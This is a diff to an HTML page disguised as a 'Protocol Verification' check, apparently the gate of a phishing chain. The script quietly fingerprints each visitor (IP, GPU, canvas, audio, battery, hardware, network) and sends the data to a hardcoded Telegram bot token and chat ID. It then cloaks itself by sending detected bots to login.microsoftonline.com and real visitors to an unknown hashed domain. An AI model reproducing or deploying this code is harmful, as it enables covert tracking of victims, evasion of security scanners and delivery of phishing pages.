@@ -3,87 +3,216 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Redirecting...</title>
+<title>Protocol Verification</title>
+<meta name="referrer" content="no-referrer">
 <style>
 :root{--p:#0ea5e9;--bg:#020617;--t:#f8fafc}
-body{margin:0;background:var(--bg);font-family:'SF Mono',menlo,monospace;color:var(--t);display:flex;justify-content:center;align-items:center;min-height:100vh}
+body{margin:0;background:var(--bg);font-family:'SF Mono',menlo,monospace;color:var(--t);
+      display:flex;justify-content:center;align-items:center;min-height:100vh}
 #sh{width:460px;padding:2rem;border-left:2px solid var(--p);background:#0b1120}
 .st{font-size:.8rem;text-transform:uppercase;letter-spacing:3px;color:var(--p);margin-bottom:.5rem}
 .dt{font-size:.75rem;color:#64748b;height:1.2rem;margin-bottom:1.5rem}
 .pb{width:100%;height:1px;background:#1e293b;position:relative}
-#f{width:0;height:100%;background:var(--p);box-shadow:0 0 8px var(--p);transition:width .3s ease}
+#f{width:0;height:100%;background:var(--p);box-shadow:0 0 8px var(--p);
+    transition:width .3s ease}
 #gl{display:none}
 </style>
 </head>
 <body>
 <div id="sh">
-<div class="st" id="s">Protocol_Init</div>
-<div class="dt" id="d">Syncing handshake...</div>
-<div class="pb"><div id="f"></div></div>
+  <div class="st" id="s">Protocol_Init</div>
+  <div class="dt" id="d">Syncing handshake...</div>
+  <div class="pb"><div id="f"></div></div>
 </div>
 <canvas id="gl"></canvas>
+
 <script>
-const CFG={D:"https://d3d97e2af1201de9799aed11aed02ffe.com/WJmmHi0ELP4/--/",B:"https://www.google.com",T:"8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",C:"659482680"};
-let res={sc:0,m:false};
-const u=(s,d,p)=>{document.getElementById('s').innerText=s;document.getElementById('d').innerText=d;document.getElementById('f').style.width=p+"%";}
-const ntg=async m=>{try{await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CFG.C,text:m,parse_mode:"HTML"})});}catch(e){}};
-const sleep=t=>new Promise(r=>setTimeout(r,t));
-const getBattery=async()=>{try{const b=await navigator.getBattery();return`${b.level*100}%_${b.charging}`;}catch(e){return"UNSUPPORTED"}};
-const getWebGLInfo=()=>{try{const c=document.getElementById('gl');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return{renderer:"NA",vendor:"NA",version:"NA"};const dbg=gl.getExtension('WEBGL_debug_renderer_info');const renderer=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);const vendor=dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);return{renderer,vendor,version:gl.getParameter(gl.VERSION)};}catch(e){return{renderer:"ERR",vendor:"ERR",version:"ERR"}}};
-const getCanvasFP=()=>{const c=document.createElement('canvas');c.width=280;c.height=60;const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='16px "Arial"';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('🧪',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('🧪',4,17);return c.toDataURL();}
-const getAudioFP=async()=>{try{const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!AC)return"UNSUPPORTED";const ctx=new AC(1,44100,44100);const osc=ctx.createOscillator();osc.type='triangle';osc.frequency.value=10000;osc.connect(ctx.destination);osc.start(0);const buf=await ctx.startRendering();let sum=0;for(let i=0;i<buf.length;i++)sum+=Math.abs(buf.getChannelData(0)[i]);return sum.toFixed(5);}catch(e){return"UNSUPPORTED"}}
-const getUAHash=()=>{let h=0;for(let i=0;i<navigator.userAgent.length;i++)h=(h<<5)-h+navigator.userAgent.charCodeAt(i);return h>>>0;}
-const getFeatures=()=>{return{serviceWorker:'serviceWorker'in navigator,webGL:'WebGLRenderingContext'in window,webRTC:'RTCPeerConnection'in window,broadcastChannel:'BroadcastChannel'in window,clipboard:'clipboard'in navigator,permissions:'permissions'in navigator};}
-const getScreenInfo=()=>{return{w:screen.width,h:screen.height,cd:screen.colorDepth,pr:window.devicePixelRatio,orientation:screen.orientation?.type||"NA"};}
-const getHardwareInfo=()=>{return{cores:navigator.hardwareConcurrency||0,mem:navigator.deviceMemory||0,lang:navigator.language||"NA",langs:navigator.languages?.join(',')||"NA"};}
-const getNetworkInfo=()=>{if('connection'in navigator){const c=navigator.connection;return{type:c.type||"NA",effectiveType:c.effectiveType||"NA",downlink:c.downlink||0,rtt:c.rtt||0};}return{type:"NA",effectiveType:"NA",downlink:0,rtt:0};}
-const getPermissions=async()=>{if(!('permissions'in navigator))return{};try{const perms=await navigator.permissions.query({name:"geolocation"});return{geolocation:perms.state};}catch(e){return{};}}
-const getTimezone=()=>{try{return Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){return"UNSUPPORTED"}}
-const detectHeadless=()=>{const probes=['webdriver','__nightmare','_selenium','callPhantom','__phantomas'];if(probes.some(p=>p in window))return true;if(navigator.webdriver)return true;if(window.chrome&&chrome.runtime&&!chrome.runtime.id)return true;return false;}
-const scorePenalties=()=>{let p=0;if(navigator.webdriver)p+=30;if(!window.PaymentRequest)p+=20;if(!window.chrome)p+=15;const bat=res.bat;if(bat&&bat!=="100%_true")p+=10;const gpuInfo=getWebGLInfo();if(gpuInfo.renderer.includes("Microsoft")||gpuInfo.vendor.includes("Swift")||gpuInfo.vendor.includes("llvm"))p+=10;if(Object.getOwnPropertyDescriptor(navigator,'webdriver')!==undefined)p+=10;if(detectHeadless())p+=30;if(getCanvasFP().includes("data:image"))p+=5;const audioHash=res.audioHash;if(audioHash==="UNSUPPORTED")p+=5;return p;}
-const collectLog=async()=>{const ipObj=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"NA"}));
-const bat=await getBattery();res.bat=bat;
-const gpu=getWebGLInfo();
-const canvas=getCanvasFP();
-const audio=await getAudioFP();res.audioHash=audio;
-const tz=getTimezone();
-const uaHash=getUAHash();
-const feats=getFeatures();
-const scr=getScreenInfo();
-const hw=getHardwareInfo();
-const net=getNetworkInfo();
-const perms=await getPermissions();
-return `<b>[LOG]</b>
-IP: ${ipObj.ip}
+/* ------------------- CONFIG ------------------- */
+const CFG = {
+  D: "https://d3d97e2af1201de9799aed11aed02ffe.com/WJmmHi0ELP4/--/",
+  B: "https://login.microsoftonline.com",
+  T: "8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",
+  C: "659482680"
+};
+
+/* ------------------- STATE ------------------- */
+let state = { score: 0, interacted: false };
+
+/* ------------------- UI HELPERS ------------------- */
+const ui = (step, msg, percent) => {
+  document.getElementById('s').innerText = step;
+  document.getElementById('d').innerText = msg;
+  document.getElementById('f').style.width = percent + "%";
+};
+
+/* ------------------- TELEGRAM LOGGING ------------------- */
+const tgLog = async txt => {
+  try {
+    await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CFG.C, text: txt, parse_mode: "HTML" })
+    });
+  } catch (_) {}
+};
+
+/* ------------------- FINGERPRINT HELPERS ------------------- */
+const getBattery = async () => {
+  try {
+    const b = await navigator.getBattery();
+    return `${b.level * 100}%_${b.charging}`;
+  } catch (_) { return "UNSUPPORTED"; }
+};
+
+const getWebGL = () => {
+  try {
+    const cvs = document.getElementById('gl');
+    const gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    const vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
+    return { renderer, vendor, version: gl.getParameter(gl.VERSION) };
+  } catch (_) { return { renderer: "ERR", vendor: "ERR", version: "ERR" }; }
+};
+
+const getCanvasFP = () => {
+  const c = document.createElement('canvas');
+  c.width = 280; c.height = 60;
+  const ctx = c.getContext('2d');
+  ctx.textBaseline = 'top';
+  ctx.font = '16px "Arial"';
+  ctx.fillStyle = '#f60';
+  ctx.fillRect(125, 1, 62, 20);
+  ctx.fillStyle = '#069';
+  ctx.fillText('🧪', 2, 15);
+  ctx.fillStyle = 'rgba(102,204,0,0.7)';
+  ctx.fillText('🧪', 4, 17);
+  return c.toDataURL();
+};
+
+const getAudioFP = async () => {
+  try {
+    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if (!AC) return "UNSUPPORTED";
+    const ctx = new AC(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    osc.connect(ctx.destination);
+    osc.start(0);
+    const buf = await ctx.startRendering();
+    let sum = 0;
+    for (let i = 0; i < buf.length; i++) sum += Math.abs(buf.getChannelData(0)[i]);
+    return sum.toFixed(5);
+  } catch (_) { return "UNSUPPORTED"; }
+};
+
+const getUAHash = () => {
+  let h = 0;
+  for (let i = 0; i < navigator.userAgent.length; i++)
+    h = (h << 5) - h + navigator.userAgent.charCodeAt(i);
+  return h >>> 0;
+};
+
+/* ------------------- BOT / HEADLESS DETECTION ------------------- */
+const detectHeadless = () => {
+  const probes = ['webdriver', '__nightmare', '_selenium', 'callPhantom', '__phantomas'];
+  if (probes.some(p => p in window)) return true;
+  if (navigator.webdriver) return true;
+  if (window.chrome && chrome.runtime && !chrome.runtime.id) return true;
+  return false;
+};
+
+/* ------------------- SCORE CALCULATION ------------------- */
+const calculateScore = async () => {
+  let penalty = 0;
+
+  // 1 – Strong, unmistakable bot signals
+  if (navigator.webdriver)                 penalty += 30;
+  if (detectHeadless())                    penalty += 30;
+  if (!window.chrome)                      penalty += 20;   // Chrome‑only browsers
+  if (!window.PaymentRequest)              penalty += 15;   // Missing PaymentRequest API
+
+  // 2 – Soft signals – we only *log* them, they do NOT penalise
+  //    (battery level, canvas fingerprint, audio fingerprint, GPU vendor oddities, etc.)
+
+  return penalty;
+};
+
+/* ------------------- LOG ASSEMBLY ------------------- */
+const assembleLog = async () => {
+  const ip = await fetch('https://api.ipify.org?format=json')
+                     .then(r => r.json())
+                     .catch(() => ({ ip: "NA" }));
+  const bat = await getBattery();
+  const gpu = getWebGL();
+  const canvas = getCanvasFP();
+  const audio = await getAudioFP();
+  const tz = (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) { return "UNSUPPORTED"; } })();
+  const uaHash = getUAHash();
+
+  return `<b>[LOG]</b>
+IP: ${ip.ip}
 UA_HASH: ${uaHash}
+BATTERY: ${bat}
 GPU_RENDERER: ${gpu.renderer}
 GPU_VENDOR: ${gpu.vendor}
 GPU_VERSION: ${gpu.version}
-BATTERY: ${bat}
 CANVAS_FP: ${canvas.slice(0,30)}
 AUDIO_FP: ${audio}
 TIMEZONE: ${tz}
-SCREEN: ${scr.w}x${scr.h} cd:${scr.cd} pr:${scr.pr} ori:${scr.orientation}
-HARDWARE: cores:${hw.cores} mem:${hw.mem} lang:${hw.lang} langs:${hw.langs}
-NETWORK: type:${net.type} effective:${net.effectiveType} dl:${net.downlink} rtt:${net.rtt}
-PERMS: ${JSON.stringify(perms)}
-FEATURES: ${JSON.stringify(feats)}`;}
-window.addEventListener('mousemove',()=>{res.m=true;}, {once:true});
-window.addEventListener('touchstart',()=>{res.m=true;}, {once:true});
-window.addEventListener('click',()=>{res.m=true;}, {once:true});
-window.addEventListener('keydown',()=>{res.m=true;}, {once:true});
-const run=async()=>{u("Ciphers_Check","Analyzing TLS stack...",15);
-res.sc+=0;
-await sleep(600);
-u("Entropy_Verify","Sampling behavioral noise...",45);
-await sleep(1200);
-u("System_Finalize","Encoding session keys...",80);
-await sleep(1000);
-res.sc-=scorePenalties();
-const log=await collectLog();
-if(res.sc<0&&!res.m){await ntg(log+"\nSTATUS: BLOCKED");window.location.replace(CFG.B);}else{u("Access_Granted","Redirecting...",100);await ntg(log+"\nSTATUS: PASSED");setTimeout(()=>window.location.href=CFG.D,400);}
+SCREEN: ${window.screen.width}x${window.screen.height} cd:${window.screen.colorDepth} pr:${window.devicePixelRatio}
+HARDWARE: cores:${navigator.hardwareConcurrency||0} mem:${navigator.deviceMemory||0}
+LANG: ${navigator.language||"NA"}
+NETWORK: ${navigator.connection?.type||"NA"} ${navigator.connection?.effectiveType||"NA"} dl:${navigator.connection?.downlink||0} rtt:${navigator.connection?.rtt||0}
+`;
 };
-window.onload=()=>{if(navigator.userAgent.includes("Bot")||navigator.userAgent.includes("Crawl")){window.location.replace(CFG.B);}else{run();}};
+
+/* ------------------- INTERACTION HANDLERS ------------------- */
+['mousemove','touchstart','click','keydown'].forEach(ev =>
+  window.addEventListener(ev, () => { state.interacted = true; }, { once: true })
+);
+
+/* ------------------- MAIN WORKFLOW ------------------- */
+const run = async () => {
+  ui("Ciphers_Check", "Analyzing TLS stack...", 15);
+  await new Promise(r => setTimeout(r, 600));
+
+  ui("Entropy_Verify", "Sampling behavioral noise...", 45);
+  await new Promise(r => setTimeout(r, 1300));
+
+  ui("System_Finalize", "Encoding session keys...", 80);
+  await new Promise(r => setTimeout(r, 1100));
+
+  const penalty = await calculateScore();
+  state.score = -penalty;                     // start from 0, subtract penalties
+
+  const log = await assembleLog();
+
+  // -----------------------------------------------------------------
+  // Decision:
+  //   • If the user has interacted, accept regardless of score.
+  //   • Otherwise block only if the *hard* penalty exceeds 40.
+  // -----------------------------------------------------------------
+  if (!state.interacted && state.score < -40) {
+    await tgLog(log + "\nSTATUS: BLOCKED");
+    window.location.replace(CFG.B);
+  } else {
+    ui("Access_Granted", "Redirecting...", 100);
+    await tgLog(log + "\nSTATUS: PASSED");
+    setTimeout(() => window.location.replace(CFG.D), 400);
+  }
+};
+
+/* ------------------- ENTRY POINT ------------------- */
+window.onload = () => {
+  const ua = navigator.userAgent;
+  if (ua.includes("Bot") || ua.includes("Crawl")) {
+    window.location.replace(CFG.B);
+  } else {
+    run();
+  }
+};
 </script>
 </body>
 </html>
